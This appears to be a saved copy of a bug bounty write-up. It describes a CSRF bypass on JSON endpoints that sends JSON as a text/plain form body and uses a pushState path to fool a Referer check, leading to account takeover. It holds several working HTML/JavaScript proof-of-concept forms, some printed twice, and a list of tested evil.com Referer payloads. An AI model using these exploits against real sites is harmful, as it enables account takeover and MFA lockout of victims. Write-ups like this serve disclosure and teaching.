#csrf #domain_cofusion #json
# summary:
- check for csrf in every changing request even if json
- try to add original host in referrer header after attacker website (domain confusion)
# report
## **Analyzing the Requests**

After looking at the http history we will find the following:  
1. All the requests are calling a `.json` endpoint, e.g., `account.example.com/login.json`

2. Requests are sent in the json format

3. There is no CSRF Header in any request

At that point, I thought the application wouldn’t be vulnerable to CSRF because the requests were sent in JSON format, and you wouldn’t be able to set the `Content-Type` header due to the [_Same-Origin-Policy_](https://portswigger.net/web-security/cors/same-origin-policy),So, I started looking for other exploits in the application. Thirty minutes later, I decided to try exploiting this CSRF vulnerability.

## Exploitation Preparation

==The only way we could exploit this is if the server wasn’t checking the== ==`Content-Type`== ==header and enforcing it to be== ==`"application/json"`====. So, let's check if the application is verifying the header or not...==

We will test the Change Phone Number function, as we could achieve an ATO if we are able to change the victim’s phone number.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*5fhdcmKdeg8UOkSssRh8Gg.png)

wooob wooob

OKAY! The phone number changed successfully. One last check, and we’re ready to go…

One more check… Does the application require a specific pattern in its JSON body, or can we add some useless parameters and still have it work?

We Can Check this by adding a random parameter with random value e.g., `"a":"test"`

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*s_9sb5YSZICDboEkFSAfcA.png)

Let’s Go now we can craft Our Exploitation

## Exploitation

Let’s Create a simple proof of concept (POC). We will set `enctype="text/plain"` and include the JSON body in a hidden input. Why did we need the extra parameter in our exploit? Because if you try to send the request like this...
```
<html>  
<head><meta name="referrer" content="unsafe-url"></head>  
<body>  
<script>history.pushState('', '', '/')</script>  
<form name="hacker" method="POST" action="https://account.example.com/phone.json" enctype="text/plain">  
<input type="hidden"  
name= '{"_formName":"change-phone","phone":"01111111118"}'>  
</form>  
<script>  
document.forms[0].submit();  
</script>  
</body>  
</html>
```
<html>  
  <head><meta name="referrer" content="unsafe-url"></head>  
  <body>  
  <script>history.pushState('', '', '/')</script>  
  <form name="hacker" method="POST" action="https://account.example.com/phone.json" enctype="text/plain">  
    <input type="hidden"  
    name= '{"_formName":"change-phone","phone":"01111111118"}'>  
    </form>  
    <script>      document.forms[0].submit();    </script>  
  </body>  
</html>

This will result in the following JSON body:

![](https://miro.medium.com/v2/resize:fit:358/1*4TlrLBmwSv5Lp9Ux8uySFQ.png)

This is not a valid JSON format because, when submitting a form, every input is expected to have both a name and a value, formatted as `name=value`. To address this, we will set the `name` attribute to our intended body, add a random parameter to take the next `=` symbol as its value, and then set the `value` attribute to `}`.

`<input type="hidden" name= '{"phone":"01111111118","a":"' value='"}'>`

This will result in our correctly formatted JSON body:

![](https://miro.medium.com/v2/resize:fit:314/1*ViAaAH0ybirtWSMZyPIM0w.png)

So Our Exploitation so far is:
```
<html>  
<head><meta name="referrer" content="unsafe-url"></head>  
<body>  
<script>history.pushState('', '', '/')</script>  
<form name="hacker" method="POST" action="https://account.example.com/phone.json" enctype="text/plain">  
<input type="hidden"  
name= '{"phone":"01111111118","a":"' value='"}'>  
</form>  
<script>  
document.forms[0].submit();  
</script>  
</body>  
</html>
```
<html>  
  <head><meta name="referrer" content="unsafe-url"></head>  
  <body>  
  <script>history.pushState('', '', '/')</script>  
  <form name="hacker" method="POST" action="https://account.example.com/phone.json" enctype="text/plain">  
    <input type="hidden"  
    name= '{"phone":"01111111118","a":"' value='"}'>  
    </form>  
    <script>      document.forms[0].submit();    </script>  
  </body>  
</html>

Since the whole application was working the same way, it became vulnerable to CSRF!

Let’s Get Our Bounty NOW

Well what about give it a try first?

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*qHGtnONsA1mEtyeTtwwz3Q.png)

??

## Further Investigation

So what is happening? Our request body looks good, and all these things are fine. Then why didn’t it work?

Let’s compare our two requests, the one sent by our exploitation and the one sent with Repeater from Burp Suite.

Since it was the same body, it’s not a problem for us. The cookie is sent successfully, so it’s not about the SameSite flag. Let’s check our headers one by one:

- The `Origin`? Nope.
- `Content-Type`? Nope.
- `Referrer`? Yes…

It needs to have the application domain to work properly. Thankfully, it’s the `Referrer` header, so we still have hope.

If we can manipulate it to make it accept our own server, we can host the exploit on it, set the header using the `history.pushState` function in JavaScript, and still exploit the bug.

So what we need here is domain confusion — to make the server think it’s their own domain when it is not.

Our Tests

- evilaccount.example.com → Fail
- evil.com/account.example.com → Fail
- account.exampleevil.com → Fail
- account.exampleevil.com → Fail
- account.example.com@evil.com → Fail
- evil.com#account.example.com → Fail

the application doesn’t validate the occurrence of domain in the header,

but if we tried something like `test@example.com` it will work and this is normal

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*Acs1wE80c_RKzehLVoDP8Q.png)

Url Contents

So the domain is valid. But what if it is only checking what comes after the `@` symbol? We can try something like this:  
`https://evil.com/test@example.com`  
Let’s try it in our Repeater.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*mjIyNJexVun8Ar4gdpDtlA.png)

LET’S GO

And Our Final Exploit Will Be:

<html>  
  <head><meta name="referrer" content="unsafe-url"></head>  
  <body>  
  <script>history.pushState('', '', '/')</script>  
  <form name="hacker" method="POST" action="https://account.example.com/phone.json" enctype="text/plain">  
    <input type="hidden"  
    name= '{"phone":"01111111118","a":"' value='"}'>  
    </form>  
    <script>      history.pushState("", "", "/anything@account.example.com")  
      document.forms[0].submit();    </script>  
  </body>  
</html>

Since this was the mitigation mechanism for the entire application, the whole application is now vulnerable to CSRF!

We Are Able To:

- Change Account Phone Number → ATO
- Change Account Username
- Change Account Real Name
- Connect/Disconnect Account From Platforms
- Create/Delete/Edit API Key With Full Permissions On Account
- 2 More Functions

One interesting aspect is that by activating MFA using authenticator apps, we only need to send a request containing the attacker’s MFA `secret key` and `OTP`. This would enable MFA on the victim’s account, making them unable to log in again.

## **Conclusion And Lessons Learned**

By this, we were able to bypass CSRF using domain confusion. What I learned from this is that I almost missed this bug due to my incorrect assumption that an application using `application/json` content type wouldn’t be vulnerable to CSRF. We need to try everything and never solely trust developers.

The “Change Phone Number” report was marked as critical (9.0–10.0) because it leads to Account Takeover (ATO).

Reward: 4000$ USD
# link 
https://infosecwriteups.com/csrf-bypass-using-domain-confusion-leads-to-ato-ac682dd17722